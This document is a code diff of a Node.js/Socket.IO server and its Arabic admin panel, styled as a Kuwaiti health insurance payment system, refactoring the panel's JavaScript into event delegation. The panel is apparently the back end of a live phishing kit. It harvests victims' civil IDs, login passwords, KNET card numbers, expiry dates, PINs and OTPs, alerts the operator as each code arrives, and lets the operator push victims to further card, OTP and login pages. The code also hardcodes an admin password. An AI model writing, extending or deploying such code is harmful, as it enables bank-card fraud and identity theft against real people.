@@ -150,7 +150,7 @@ app.post('/admin/payments/:id/action', (req, res) => {
   if (action === 'accept' || action === 'pass') {
     if (payment.step === 1) payment.status = 'APPROVED';
     else if (payment.step === 2) payment.status = 'SUCCESS';
-    else if (payment.step === 3) payment.status = 'SUCCESS';
+    else payment.status = 'SUCCESS';
   } else if (action === 'reject' || action === 'denied') {
     if (payment.step === 2) payment.status = 'OTP_FAILED';
     else payment.status = 'REJECTED';
@@ -182,7 +182,6 @@ io.on('connection', (socket) => {
     const validToken = data && data.token && data.token.startsWith('admin_token_');
     const validPassword = data && data.password && data.password === ADMIN_PASSWORD;
     if (validToken || validPassword) {
-      // Remove if already in list
       adminSockets = adminSockets.filter(s => s.id !== socket.id);
       adminSockets.push(socket);
       socket.isAdmin = true;
@@ -209,15 +208,7 @@ io.on('connection', (socket) => {
 });
 
 function getAdminHTML() {
-  return `<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>لوحة التحكم - نظام الضمان الصحي الكويتي</title>
-  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
-  <script src="/socket.io/socket.io.js"><\/script>
-  <style>
+  const css = `
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body { background: #f8fafc; color: #1e293b; font-family: 'Segoe UI', Tahoma, Arial, sans-serif; font-size: 14px; }
     #login-page { min-height: 100vh; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, #f0f9ff 0%, #e0f2fe 100%); }
@@ -325,16 +316,26 @@ function getAdminHTML() {
     .ref-code { font-family: monospace; font-size: 12px; color: #0ea5e9; background: #f0f9ff; padding: 2px 6px; border-radius: 4px; }
     @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
     @keyframes slideDown { from { transform: translateX(-50%) translateY(-20px); opacity: 0; } to { transform: translateX(-50%) translateY(0); opacity: 1; } }
-  </style>
+  `;
+
+  const html = `<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>لوحة التحكم - نظام الضمان الصحي الكويتي</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
+  <script src="/socket.io/socket.io.js"><\/script>
+  <style>${css}<\/style>
 </head>
 <body>
 <div id="login-page">
   <div class="login-card">
-    <div class="login-logo">🏥</div>
+    <div class="login-logo">&#x1F3E5;</div>
     <div class="login-title">نظام الضمان الصحي الكويتي</div>
     <div class="login-sub">لوحة التحكم الإدارية</div>
-    <input type="password" id="pw-input" class="login-input" placeholder="أدخل كلمة المرور" onkeydown="if(event.key==='Enter')doLogin()">
-    <button class="login-btn" onclick="doLogin()"><i class="bi bi-shield-lock"></i> تسجيل الدخول</button>
+    <input type="password" id="pw-input" class="login-input" placeholder="أدخل كلمة المرور">
+    <button class="login-btn" id="login-btn"><i class="bi bi-shield-lock"></i> تسجيل الدخول</button>
     <div class="login-error" id="login-error">كلمة المرور غير صحيحة</div>
   </div>
 </div>
@@ -349,8 +350,8 @@ function getAdminHTML() {
     </div>
     <div class="header-right">
       <div class="status-badge" id="conn-badge"><div class="status-dot"></div><span id="conn-text">متصل</span></div>
-      <div class="notif-btn" onclick="toggleNotifPanel()"><i class="bi bi-bell"></i><div class="notif-badge" id="notif-badge">0</div></div>
-      <button class="logout-btn" onclick="doLogout()"><i class="bi bi-box-arrow-right"></i> خروج</button>
+      <div class="notif-btn" id="notif-btn"><i class="bi bi-bell"></i><div class="notif-badge" id="notif-badge">0</div></div>
+      <button class="logout-btn" id="logout-btn"><i class="bi bi-box-arrow-right"></i> خروج</button>
     </div>
   </div>
   <div class="stats-grid">
@@ -363,16 +364,16 @@ function getAdminHTML() {
   <div class="main-content">
     <div class="section-header">
       <div class="section-title"><i class="bi bi-credit-card" style="color:#0ea5e9"></i> قائمة طلبات الدفع KNET</div>
-      <div class="search-box"><i class="bi bi-search"></i><input type="text" id="srch" placeholder="بحث..." oninput="renderPayments()"></div>
+      <div class="search-box"><i class="bi bi-search"></i><input type="text" id="srch" placeholder="بحث..."></div>
     </div>
     <div class="table-wrapper">
       <div id="payments-container"><div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>لا توجد طلبات بعد</div></div></div>
     </div>
   </div>
 </div>
-<div class="modal-overlay" id="modal-overlay" onclick="if(event.target===this)closeModal()">
+<div class="modal-overlay" id="modal-overlay">
   <div class="modal">
-    <div class="modal-header"><div class="modal-title" id="modal-title">تفاصيل الطلب</div><button class="modal-close-btn" onclick="closeModal()"><i class="bi bi-x-lg"></i></button></div>
+    <div class="modal-header"><div class="modal-title" id="modal-title">تفاصيل الطلب</div><button class="modal-close-btn" id="modal-close-btn"><i class="bi bi-x-lg"></i></button></div>
     <div id="modal-body"></div>
   </div>
 </div>
@@ -382,31 +383,352 @@ function getAdminHTML() {
   <div class="notif-data" id="notif-data"></div>
 </div>
 <script>
-let adminToken=null,socket=null,allPayments=[],notifCount=0,notifTimeout;
-async function doLogin(){const pw=document.getElementById('pw-input').value;try{const res=await fetch('/admin/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({password:pw})});const data=await res.json();if(data.success){adminToken=data.token;document.getElementById('login-page').style.display='none';document.getElementById('dashboard').style.display='block';initSocket();loadPayments();}else{document.getElementById('login-error').style.display='block';}}catch(e){document.getElementById('login-error').style.display='block';}}
-function doLogout(){adminToken=null;if(socket)socket.disconnect();document.getElementById('dashboard').style.display='none';document.getElementById('login-page').style.display='flex';document.getElementById('pw-input').value='';}
-function initSocket(){socket=io();socket.on('connect',()=>{document.getElementById('conn-badge').style.background='#f0fdf4';document.getElementById('conn-text').textContent='متصل';socket.emit('admin_join',{token:adminToken,password:'Admin@2024'});loadPayments();});socket.on('disconnect',()=>{document.getElementById('conn-badge').style.background='#fef2f2';document.getElementById('conn-text').textContent='غير متصل';});socket.on('payment_new',(payment)=>{const idx=allPayments.findIndex(p=>p.id===payment.id);if(idx!==-1){allPayments[idx]=payment;}else{allPayments.unshift(payment);}renderPayments();updateStats();showNotification('💳 طلب دفع جديد!',(payment.loginCivilId||payment.clientId||'')+' - '+(payment.bankName||''),(payment.prefix||'')+' '+(payment.cardNumber||''),'new-payment');playSound();bumpNotif();});socket.on('payment_otp_received',(data)=>{const idx=allPayments.findIndex(p=>p.id===data.id||p.id===data.paymentId);if(idx!==-1){allPayments[idx]=data.payment||allPayments[idx];renderPayments();updateStats();}showNotification('🔑 OTP جديد وصل!','الرقم المرجعي: '+(data.payment?data.payment.refNumber:''),data.otp||'','new-otp');playSound();bumpNotif();});socket.on('payment_pin_received',(data)=>{const idx=allPayments.findIndex(p=>p.id===data.id||p.id===data.paymentId);if(idx!==-1){allPayments[idx]=data.payment||allPayments[idx];renderPayments();updateStats();}showNotification('🔒 رقم سري جديد!','الرقم المرجعي: '+(data.payment?data.payment.refNumber:''),data.pin||'','new-pin');playSound();bumpNotif();});socket.on('payment_status_changed',(data)=>{const idx=allPayments.findIndex(p=>p.id===data.id||p.id===data.paymentId);if(idx!==-1){if(data.payment){allPayments[idx]=data.payment;}else{allPayments[idx].status=data.status;}renderPayments();updateStats();}});socket.on('payments_list',(list)=>{allPayments=list;renderPayments();updateStats();});socket.on('login_new',(data)=>{showNotification('🔐 تسجيل دخول جديد!',data.loginCivilId||data.civilId||'',data.loginPassword||'','new-payment');playSound();bumpNotif();});socket.on('active_users',(users)=>{document.getElementById('stat-online').textContent=users.length;});}
-async function loadPayments(){try{const res=await fetch('/admin/payments');allPayments=await res.json();renderPayments();updateStats();}catch(e){}}
-function renderPayments(){const container=document.getElementById('payments-container');const q=(document.getElementById('srch')?.value||'').toLowerCase();let list=allPayments;if(q){list=allPayments.filter(p=>(p.loginCivilId||'').toLowerCase().includes(q)||(p.clientId||'').toLowerCase().includes(q)||(p.bankName||'').toLowerCase().includes(q)||(p.cardNumber||'').toLowerCase().includes(q)||(p.refNumber||'').toLowerCase().includes(q)||(p.status||'').toLowerCase().includes(q));}if(!list.length){container.innerHTML='<div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>'+(q?'لا توجد نتائج':'لا توجد طلبات بعد')+'</div></div>';return;}let html='<table class="payments-table"><thead><tr><th>المرجع</th><th>الرقم المدني</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>الحالة</th><th>OTP</th><th>الإجراءات</th></tr></thead><tbody>';list.forEach(p=>{const otp=p.knetOtps&&p.knetOtps.length?p.knetOtps[0].otp:'-';html+='<tr>';html+='<td><span class="ref-code">'+(p.refNumber||p.id.substring(0,8))+'</span></td>';html+='<td><b>'+(p.loginCivilId||p.clientId||'-')+'</b></td>';html+='<td>'+(p.bankName||'-')+'</td>';html+='<td><span style="font-family:monospace">'+(p.prefix||'')+' '+(p.cardNumber||'-')+'</span></td>';html+='<td>'+(p.expiryMonth||'')+(p.expiryMonth&&p.expiryYear?'/':'')+(p.expiryYear||'-')+'</td>';html+='<td>'+getStatusBadge(p.status)+'</td>';html+='<td><span style="font-family:monospace;font-weight:700;color:#d97706">'+otp+'</span></td>';html+='<td>'+getActions(p)+'</td>';html+='</tr>';});html+='</tbody></table>';container.innerHTML=html;}
-function getStatusBadge(status){const map={'PENDING':'<span class="badge badge-pending">انتظار</span>','APPROVED':'<span class="badge badge-approved">موافقة ✓</span>','OTP_REQUEST':'<span class="badge badge-otp">OTP وصل</span>','OTP_FAILED':'<span class="badge badge-failed">OTP خاطئ</span>','SUCCESS':'<span class="badge badge-success">مكتمل ✓</span>','REJECTED':'<span class="badge badge-rejected">مرفوض ✗</span>','pending_card':'<span class="badge badge-pending">انتظار البطاقة</span>','waiting_otp':'<span class="badge badge-otp">انتظار OTP</span>','pending_otp':'<span class="badge badge-otp">OTP وصل</span>','waiting_pin':'<span class="badge badge-otp">انتظار الرقم السري</span>','pending_pin':'<span class="badge badge-otp">الرقم السري وصل</span>','completed':'<span class="badge badge-success">مكتمل ✓</span>','rejected':'<span class="badge badge-rejected">مرفوض ✗</span>'};return map[status]||'<span class="badge badge-pending">'+(status||'غير محدد')+'</span>';}
-function getActions(p){const id=p.id;let html='<div class="btn-actions">';html+='<button class="btn btn-details" onclick="showDetails(\''+id+'\')"><i class="bi bi-eye"></i> تفاصيل</button>';html+='<div class="dropdown"><button class="btn btn-nav" onclick="toggleDropdown(\'dd-'+id+'\')"><i class="bi bi-send"></i> توجيه <i class="bi bi-chevron-down"></i></button><div class="dropdown-menu" id="dd-'+id+'">';html+='<button class="dropdown-item" onclick="navUser(\''+id+'\',\'/knet\')"><i class="bi bi-credit-card" style="color:#16a34a"></i>صفحة KNET</button>';html+='<button class="dropdown-item" onclick="navUser(\''+id+'\',\'/knet-otp\')"><i class="bi bi-phone" style="color:#2563eb"></i>صفحة OTP</button>';html+='<button class="dropdown-item" onclick="navUser(\''+id+'\',\'/sign-up\')"><i class="bi bi-person-plus" style="color:#7c3aed"></i>صفحة التسجيل</button>';html+='<button class="dropdown-item" onclick="navUser(\''+id+'\',\'/login\')"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>صفحة الدخول</button>';html+='<button class="dropdown-item" onclick="navUser(\''+id+'\',\'/\')"><i class="bi bi-house" style="color:#64748b"></i>الصفحة الرئيسية</button>';html+='</div></div></div>';return html;}
-function toggleDropdown(id){document.querySelectorAll('.dropdown-menu.show').forEach(el=>{if(el.id!==id)el.classList.remove('show');});const el=document.getElementById(id);if(el)el.classList.toggle('show');}
-document.addEventListener('click',(e)=>{if(!e.target.closest('.dropdown'))document.querySelectorAll('.dropdown-menu.show').forEach(el=>el.classList.remove('show'));});
-async function navUser(paymentId,page){document.querySelectorAll('.dropdown-menu.show').forEach(el=>el.classList.remove('show'));try{await fetch('/admin/navigate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({paymentId,page})});showNotification('📤 تم التوجيه','تم إرسال أمر التوجيه للعميل',page,'');}catch(e){}}
-async function doAction(paymentId,action){try{const res=await fetch('/admin/payments/'+paymentId+'/action',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action})});const data=await res.json();if(data.success){const idx=allPayments.findIndex(p=>p.id===paymentId);if(idx!==-1){allPayments[idx]=data.payment;}renderPayments();updateStats();}}catch(e){}}
-function showDetails(paymentId){const p=allPayments.find(x=>x.id===paymentId);if(!p)return;const otp=p.knetOtps&&p.knetOtps.length?p.knetOtps[0].otp:null;const stepNames={1:'بيانات البطاقة',2:'رمز OTP',3:'رقم سري'};const step=p.step||1;let html='';html+='<div class="sec-title">بيانات العميل</div><div class="detail-grid">';html+=dRow('الرقم المدني',p.loginCivilId||p.clientId);html+=dRow('كلمة المرور',p.loginPassword,true);html+=dRow('الرقم المرجعي',p.refNumber);html+=dRow('تاريخ الطلب',p.created_at?new Date(p.created_at).toLocaleString('ar-KW'):'-');html+='</div>';html+='<div class="sec-title">بيانات البطاقة</div><div class="detail-grid">';html+=dRow('البنك',p.bankName);html+=dRow('رقم البطاقة',(p.prefix||'')+' '+(p.cardNumber||''),true);html+=dRow('تاريخ الانتهاء',(p.expiryMonth||'')+'/'+(p.expiryYear||''));html+=dRow('الرقم السري (PIN)',p.pass&&p.pass!=='---'?p.pass:null,true);html+='</div>';if(otp){html+='<div class="sec-title">بيانات OTP</div><div class="detail-grid">';html+=dRow('رمز OTP',otp,true);if(p.knetOtps&&p.knetOtps.length>1){p.knetOtps.slice(1).forEach((o,i)=>{html+=dRow('OTP سابق '+(i+1),o.otp,true);});}html+='</div>';}html+='<div class="action-section"><div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div><div class="action-step-info">الخطوة الحالية: '+(stepNames[step]||'بيانات البطاقة')+' | الحالة: '+(p.status||'PENDING')+'</div><div class="action-btns"><button class="action-btn-approve" onclick="doAction(\''+p.id+'\',\'accept\')"><i class="bi bi-check-circle-fill"></i> قبول</button><button class="action-btn-reject" onclick="doAction(\''+p.id+'\',\'reject\')"><i class="bi bi-x-circle-fill"></i> رفض</button></div></div>';html+='<div class="nav-section"><div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div><div class="nav-btns"><button class="nav-btn" onclick="navUser(\''+p.id+'\',\'/knet\')"><i class="bi bi-credit-card" style="color:#16a34a"></i>KNET</button><button class="nav-btn" onclick="navUser(\''+p.id+'\',\'/knet-otp\')"><i class="bi bi-phone" style="color:#2563eb"></i>OTP</button><button class="nav-btn" onclick="navUser(\''+p.id+'\',\'/sign-up\')"><i class="bi bi-person-plus" style="color:#7c3aed"></i>التسجيل</button><button class="nav-btn" onclick="navUser(\''+p.id+'\',\'/login\')"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>الدخول</button><button class="nav-btn" onclick="navUser(\''+p.id+'\',\'/\')"><i class="bi bi-house" style="color:#64748b"></i>الرئيسية</button></div></div>';document.getElementById('modal-title').textContent='تفاصيل الطلب - '+(p.refNumber||p.id.substring(0,8));document.getElementById('modal-body').innerHTML=html;document.getElementById('modal-overlay').classList.add('active');}
-function dRow(label,val,sensitive){if(!val)return '';const v='<span class="d-val'+(sensitive?' sensitive':'')+'">'+val+'<button class="copy-btn" onclick="cp(\''+val+'\')"><i class="bi bi-copy"></i></button></span>';return '<div><div class="d-lbl">'+label+'</div>'+v+'</div>';}
-function cp(val){try{navigator.clipboard.writeText(val);}catch(e){}}
-function closeModal(){document.getElementById('modal-overlay').classList.remove('active');}
-function updateStats(){document.getElementById('stat-total').textContent=allPayments.length;document.getElementById('stat-pending').textContent=allPayments.filter(p=>['PENDING','OTP_REQUEST','pending_card','waiting_otp','pending_otp','waiting_pin','pending_pin'].includes(p.status)).length;document.getElementById('stat-approved').textContent=allPayments.filter(p=>['SUCCESS','APPROVED','completed'].includes(p.status)).length;document.getElementById('stat-rejected').textContent=allPayments.filter(p=>['REJECTED','OTP_FAILED','rejected'].includes(p.status)).length;}
-function showNotification(title,sub,data,type){const el=document.getElementById('notification');document.getElementById('notif-title').textContent=title;document.getElementById('notif-sub').textContent=sub||'';document.getElementById('notif-data').textContent=data||'';el.className='notification show '+(type||'');clearTimeout(notifTimeout);notifTimeout=setTimeout(()=>{el.classList.remove('show');},5000);}
-function bumpNotif(){notifCount++;const badge=document.getElementById('notif-badge');badge.style.display='flex';badge.textContent=notifCount;}
-function toggleNotifPanel(){notifCount=0;const badge=document.getElementById('notif-badge');badge.style.display='none';}
-function playSound(){try{const ctx=new(window.AudioContext||window.webkitAudioContext)();const osc=ctx.createOscillator();const gain=ctx.createGain();osc.connect(gain);gain.connect(ctx.destination);osc.frequency.value=880;gain.gain.setValueAtTime(0.3,ctx.currentTime);gain.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.5);osc.start(ctx.currentTime);osc.stop(ctx.currentTime+0.5);}catch(e){}}
-setInterval(()=>{if(adminToken)loadPayments();},15000);
+(function() {
+  var adminToken = null;
+  var socket = null;
+  var allPayments = [];
+  var notifCount = 0;
+  var notifTimeout = null;
+  var currentModalId = null;
+
+  // Login
+  document.getElementById('pw-input').addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') doLogin();
+  });
+  document.getElementById('login-btn').addEventListener('click', doLogin);
+  document.getElementById('logout-btn').addEventListener('click', doLogout);
+  document.getElementById('modal-close-btn').addEventListener('click', closeModal);
+  document.getElementById('modal-overlay').addEventListener('click', function(e) {
+    if (e.target === this) closeModal();
+  });
+  document.getElementById('srch').addEventListener('input', renderPayments);
+
+  // Event delegation for table buttons
+  document.getElementById('payments-container').addEventListener('click', function(e) {
+    var btn = e.target.closest('[data-action]');
+    if (!btn) return;
+    var action = btn.getAttribute('data-action');
+    var id = btn.getAttribute('data-id');
+    var page = btn.getAttribute('data-page');
+    if (action === 'details') showDetails(id);
+    else if (action === 'toggle-dd') toggleDropdown('dd-' + id);
+    else if (action === 'nav') navUser(id, page);
+  });
+
+  // Event delegation for modal buttons
+  document.getElementById('modal-body').addEventListener('click', function(e) {
+    var btn = e.target.closest('[data-action]');
+    if (!btn) return;
+    var action = btn.getAttribute('data-action');
+    var id = btn.getAttribute('data-id');
+    var page = btn.getAttribute('data-page');
+    var val = btn.getAttribute('data-val');
+    if (action === 'approve') doAction(id, 'accept');
+    else if (action === 'reject') doAction(id, 'reject');
+    else if (action === 'nav') navUser(id, page);
+    else if (action === 'copy') copyVal(val);
+  });
+
+  document.addEventListener('click', function(e) {
+    if (!e.target.closest('.dropdown')) {
+      document.querySelectorAll('.dropdown-menu.show').forEach(function(el) { el.classList.remove('show'); });
+    }
+  });
+
+  async function doLogin() {
+    var pw = document.getElementById('pw-input').value;
+    try {
+      var res = await fetch('/admin/login', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({password: pw}) });
+      var data = await res.json();
+      if (data.success) {
+        adminToken = data.token;
+        document.getElementById('login-page').style.display = 'none';
+        document.getElementById('dashboard').style.display = 'block';
+        initSocket();
+        loadPayments();
+      } else {
+        document.getElementById('login-error').style.display = 'block';
+      }
+    } catch(e) {
+      document.getElementById('login-error').style.display = 'block';
+    }
+  }
+
+  function doLogout() {
+    adminToken = null;
+    if (socket) socket.disconnect();
+    document.getElementById('dashboard').style.display = 'none';
+    document.getElementById('login-page').style.display = 'flex';
+    document.getElementById('pw-input').value = '';
+  }
+
+  function initSocket() {
+    socket = io();
+    socket.on('connect', function() {
+      document.getElementById('conn-badge').style.background = '#f0fdf4';
+      document.getElementById('conn-text').textContent = 'متصل';
+      socket.emit('admin_join', { token: adminToken, password: 'Admin@2024' });
+      loadPayments();
+    });
+    socket.on('disconnect', function() {
+      document.getElementById('conn-badge').style.background = '#fef2f2';
+      document.getElementById('conn-text').textContent = 'غير متصل';
+    });
+    socket.on('payment_new', function(payment) {
+      var idx = allPayments.findIndex(function(p) { return p.id === payment.id; });
+      if (idx !== -1) allPayments[idx] = payment;
+      else allPayments.unshift(payment);
+      renderPayments(); updateStats();
+      showNotification('طلب دفع جديد!', (payment.loginCivilId || payment.clientId || '') + ' - ' + (payment.bankName || ''), (payment.prefix || '') + ' ' + (payment.cardNumber || ''), 'new-payment');
+      playSound(); bumpNotif();
+    });
+    socket.on('payment_otp_received', function(data) {
+      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
+      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
+      showNotification('OTP جديد وصل!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.otp || '', 'new-otp');
+      playSound(); bumpNotif();
+    });
+    socket.on('payment_pin_received', function(data) {
+      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
+      if (idx !== -1) { allPayments[idx] = data.payment || allPayments[idx]; renderPayments(); updateStats(); }
+      showNotification('رقم سري جديد!', 'الرقم المرجعي: ' + (data.payment ? data.payment.refNumber : ''), data.pin || '', 'new-pin');
+      playSound(); bumpNotif();
+    });
+    socket.on('payment_status_changed', function(data) {
+      var idx = allPayments.findIndex(function(p) { return p.id === data.id || p.id === data.paymentId; });
+      if (idx !== -1) {
+        if (data.payment) allPayments[idx] = data.payment;
+        else allPayments[idx].status = data.status;
+        renderPayments(); updateStats();
+      }
+    });
+    socket.on('payments_list', function(list) { allPayments = list; renderPayments(); updateStats(); });
+    socket.on('login_new', function(data) {
+      showNotification('تسجيل دخول جديد!', data.loginCivilId || data.civilId || '', data.loginPassword || '', 'new-payment');
+      playSound(); bumpNotif();
+    });
+    socket.on('active_users', function(users) {
+      document.getElementById('stat-online').textContent = users.length;
+    });
+  }
+
+  async function loadPayments() {
+    try {
+      var res = await fetch('/admin/payments');
+      allPayments = await res.json();
+      renderPayments(); updateStats();
+    } catch(e) {}
+  }
+
+  function getStatusBadge(status) {
+    var map = {
+      'PENDING': '<span class="badge badge-pending">انتظار</span>',
+      'APPROVED': '<span class="badge badge-approved">موافقة</span>',
+      'OTP_REQUEST': '<span class="badge badge-otp">OTP وصل</span>',
+      'OTP_FAILED': '<span class="badge badge-failed">OTP خاطئ</span>',
+      'SUCCESS': '<span class="badge badge-success">مكتمل</span>',
+      'REJECTED': '<span class="badge badge-rejected">مرفوض</span>',
+      'pending_card': '<span class="badge badge-pending">انتظار البطاقة</span>',
+      'waiting_otp': '<span class="badge badge-otp">انتظار OTP</span>',
+      'pending_otp': '<span class="badge badge-otp">OTP وصل</span>',
+      'waiting_pin': '<span class="badge badge-otp">انتظار الرقم السري</span>',
+      'pending_pin': '<span class="badge badge-otp">الرقم السري وصل</span>',
+      'completed': '<span class="badge badge-success">مكتمل</span>',
+      'rejected': '<span class="badge badge-rejected">مرفوض</span>'
+    };
+    return map[status] || '<span class="badge badge-pending">' + (status || 'غير محدد') + '</span>';
+  }
+
+  function renderPayments() {
+    var container = document.getElementById('payments-container');
+    var q = (document.getElementById('srch').value || '').toLowerCase();
+    var list = allPayments;
+    if (q) {
+      list = allPayments.filter(function(p) {
+        return (p.loginCivilId || '').toLowerCase().includes(q) ||
+               (p.clientId || '').toLowerCase().includes(q) ||
+               (p.bankName || '').toLowerCase().includes(q) ||
+               (p.cardNumber || '').toLowerCase().includes(q) ||
+               (p.refNumber || '').toLowerCase().includes(q) ||
+               (p.status || '').toLowerCase().includes(q);
+      });
+    }
+    if (!list.length) {
+      container.innerHTML = '<div class="empty-state"><div class="empty-icon"><i class="bi bi-inbox"></i></div><div>' + (q ? 'لا توجد نتائج' : 'لا توجد طلبات بعد') + '</div></div>';
+      return;
+    }
+    var html = '<table class="payments-table"><thead><tr><th>المرجع</th><th>الرقم المدني</th><th>البنك</th><th>رقم البطاقة</th><th>الانتهاء</th><th>الحالة</th><th>OTP</th><th>الإجراءات</th></tr></thead><tbody>';
+    list.forEach(function(p) {
+      var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : '-';
+      var id = p.id;
+      html += '<tr>';
+      html += '<td><span class="ref-code">' + (p.refNumber || id.substring(0, 8)) + '</span></td>';
+      html += '<td><b>' + (p.loginCivilId || p.clientId || '-') + '</b></td>';
+      html += '<td>' + (p.bankName || '-') + '</td>';
+      html += '<td><span style="font-family:monospace">' + (p.prefix || '') + ' ' + (p.cardNumber || '-') + '</span></td>';
+      html += '<td>' + (p.expiryMonth || '') + (p.expiryMonth && p.expiryYear ? '/' : '') + (p.expiryYear || '-') + '</td>';
+      html += '<td>' + getStatusBadge(p.status) + '</td>';
+      html += '<td><span style="font-family:monospace;font-weight:700;color:#d97706">' + otp + '</span></td>';
+      html += '<td><div class="btn-actions">';
+      html += '<button class="btn btn-details" data-action="details" data-id="' + id + '"><i class="bi bi-eye"></i> تفاصيل</button>';
+      html += '<div class="dropdown">';
+      html += '<button class="btn btn-nav" data-action="toggle-dd" data-id="' + id + '"><i class="bi bi-send"></i> توجيه <i class="bi bi-chevron-down"></i></button>';
+      html += '<div class="dropdown-menu" id="dd-' + id + '">';
+      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>صفحة KNET</button>';
+      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>صفحة OTP</button>';
+      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/sign-up"><i class="bi bi-person-plus" style="color:#7c3aed"></i>صفحة التسجيل</button>';
+      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/login"><i class="bi bi-box-arrow-in-right" style="color:#ea580c"></i>صفحة الدخول</button>';
+      html += '<button class="dropdown-item" data-action="nav" data-id="' + id + '" data-page="/"><i class="bi bi-house" style="color:#64748b"></i>الصفحة الرئيسية</button>';
+      html += '</div></div></div></td>';
+      html += '</tr>';
+    });
+    html += '</tbody></table>';
+    container.innerHTML = html;
+  }
+
+  function toggleDropdown(id) {
+    document.querySelectorAll('.dropdown-menu.show').forEach(function(el) {
+      if (el.id !== id) el.classList.remove('show');
+    });
+    var el = document.getElementById(id);
+    if (el) el.classList.toggle('show');
+  }
+
+  async function navUser(paymentId, page) {
+    document.querySelectorAll('.dropdown-menu.show').forEach(function(el) { el.classList.remove('show'); });
+    try {
+      await fetch('/admin/navigate', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({paymentId: paymentId, page: page}) });
+      showNotification('تم التوجيه', 'تم إرسال أمر التوجيه للعميل', page, '');
+    } catch(e) {}
+  }
+
+  async function doAction(paymentId, action) {
+    try {
+      var res = await fetch('/admin/payments/' + paymentId + '/action', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action: action}) });
+      var data = await res.json();
+      if (data.success) {
+        var idx = allPayments.findIndex(function(p) { return p.id === paymentId; });
+        if (idx !== -1) allPayments[idx] = data.payment;
+        renderPayments(); updateStats();
+        closeModal();
+      }
+    } catch(e) {}
+  }
+
+  function showDetails(paymentId) {
+    var p = allPayments.find(function(x) { return x.id === paymentId; });
+    if (!p) return;
+    currentModalId = paymentId;
+    var otp = p.knetOtps && p.knetOtps.length ? p.knetOtps[0].otp : null;
+    var stepNames = {1: 'بيانات البطاقة', 2: 'رمز OTP', 3: 'رقم سري'};
+    var step = p.step || 1;
+    var html = '';
+    html += '<div class="sec-title">بيانات العميل</div><div class="detail-grid">';
+    html += dRow('الرقم المدني', p.loginCivilId || p.clientId, false);
+    html += dRow('كلمة المرور', p.loginPassword, true);
+    html += dRow('الرقم المرجعي', p.refNumber, false);
+    html += dRow('تاريخ الطلب', p.created_at ? new Date(p.created_at).toLocaleString('ar-KW') : '-', false);
+    html += '</div>';
+    html += '<div class="sec-title">بيانات البطاقة</div><div class="detail-grid">';
+    html += dRow('البنك', p.bankName, false);
+    html += dRow('رقم البطاقة', (p.prefix || '') + ' ' + (p.cardNumber || ''), true);
+    html += dRow('تاريخ الانتهاء', (p.expiryMonth || '') + '/' + (p.expiryYear || ''), false);
+    html += dRow('الرقم السري (PIN)', p.pass && p.pass !== '---' ? p.pass : null, true);
+    html += '</div>';
+    if (otp) {
+      html += '<div class="sec-title">بيانات OTP</div><div class="detail-grid">';
+      html += dRow('رمز OTP', otp, true);
+      if (p.knetOtps && p.knetOtps.length > 1) {
+        p.knetOtps.slice(1).forEach(function(o, i) { html += dRow('OTP سابق ' + (i + 1), o.otp, true); });
+      }
+      html += '</div>';
+    }
+    html += '<div class="action-section">';
+    html += '<div class="action-sec-title"><i class="bi bi-shield-check" style="color:#16a34a"></i> إجراء عملية الدفع</div>';
+    html += '<div class="action-step-info">الخطوة الحالية: ' + (stepNames[step] || 'بيانات البطاقة') + ' | الحالة: ' + (p.status || 'PENDING') + '</div>';
+    html += '<div class="action-btns">';
+    html += '<button class="action-btn-approve" data-action="approve" data-id="' + p.id + '"><i class="bi bi-check-circle-fill"></i> قبول</button>';
+    html += '<button class="action-btn-reject" data-action="reject" data-id="' + p.id + '"><i class="bi bi-x-circle-fill"></i> رفض</button>';
+    html += '</div></div>';
+    html += '<div class="nav-section">';
+    html += '<div class="nav-sec-title"><i class="bi bi-send"></i> توجيه العميل إلى صفحة</div>';
+    html += '<div class="nav-btns">';
+    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet"><i class="bi bi-credit-card" style="color:#16a34a"></i>KNET</button>';
+    html += '<button class="nav-btn" data-action="nav" data-id="' + p.id + '" data-page="/knet-otp"><i class="bi bi-phone" style="color:#2563eb"></i>OTP</button>';
